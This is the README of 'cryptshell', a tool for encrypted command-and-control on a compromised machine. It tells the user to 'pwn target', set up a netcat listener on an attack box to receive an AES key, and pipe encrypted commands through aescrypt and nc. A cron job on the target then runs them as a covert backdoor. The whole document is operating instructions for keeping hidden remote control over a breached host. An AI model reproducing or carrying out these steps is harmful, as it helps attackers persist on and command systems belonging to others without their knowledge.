# cryptshell
AES Encrypted C2 Campaign Management

## usage
- pwn target
- configure the following variables in cryptshell
	- RHOST (the IP of your C2 server that you will be sending the commands from)
	- RPORT (the port on your C2 server that you want cryptshell to send the AES key to)
	- LPORT (the port you want the target to listen on)
- setup listener on attack box (to recieve key): nc -lnvp $RPORT > aes.key
- run cryptshell on target and kill the connection after the key is transferred
- pipe c2 commands through aescrypt and a socket to your target (the listener and decrypter are on a cron): echo "touch tmp" | aescrypt -e -k aes.key - | nc target $LPORT
	- since it runs on a cron, you can only send one payload per cron cycle, so I suggest you prepare scripted one liners
	- you will know if the commands were sent if you run the command and the connection hangs, wait a few seconds and force quit it
